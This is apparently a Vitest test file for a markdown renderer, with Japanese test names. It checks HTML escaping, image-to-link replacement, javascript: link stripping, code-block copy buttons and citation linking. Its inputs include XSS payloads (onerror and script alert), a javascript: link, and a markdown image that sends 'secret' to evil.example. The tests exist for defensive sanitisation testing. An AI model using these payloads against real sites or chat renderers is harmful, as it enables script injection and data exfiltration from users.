// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './render';

describe('renderMarkdown', () => {
  it('生 HTML をエスケープし、スクリプトを実行可能にしない', () => {
    const html = renderMarkdown('<img src=x onerror=alert(1)><script>alert(1)</script>', { highlight: false });
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;');
  });
  it('外部画像はリンクに置き換える', () => {
    const html = renderMarkdown('![leak](https://evil.example/?q=secret)', { highlight: false });
    expect(html).not.toContain('<img');
    expect(html).toContain('md-img-link');
  });
  it('javascript: リンクを無効化し、外部リンクに rel を付ける', () => {
    const html = renderMarkdown('[a](javascript:alert(1)) [b](https://ok.example)', { highlight: false });
    expect(html).not.toContain('javascript:');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });
  it('コードブロックにコピー用ボタンを付ける', () => {
    const html = renderMarkdown('```js\nconst a = 1 < 2;\n```', { highlight: false });
    expect(html).toContain('data-copy');
    expect(html).toContain('1 &lt; 2');
  });
});

import { linkCitations } from './render';
describe('linkCitations', () => {
  it('^1^ と ^1,2^ を出典リンクにし、存在しない番号はそのまま', () => {
    const out = linkCitations('A^1^ B^1,2^ C^9^', ['https://a.example/x(1)', 'https://b.example/']);
    expect(out).toContain(String.raw`[\[1\]](https://a.example/x%281%29)`);
    expect(out).toContain(String.raw`[\[2\]](https://b.example/)`);
    expect(out).toContain('C[9]');
  });
  it('レンダリング後に出典リンクになる', () => {
    const html = renderMarkdown('事実^1^。', { highlight: false, citations: ['https://a.example/'] });
    expect(html).toContain('href="https://a.example/"');
  });
});
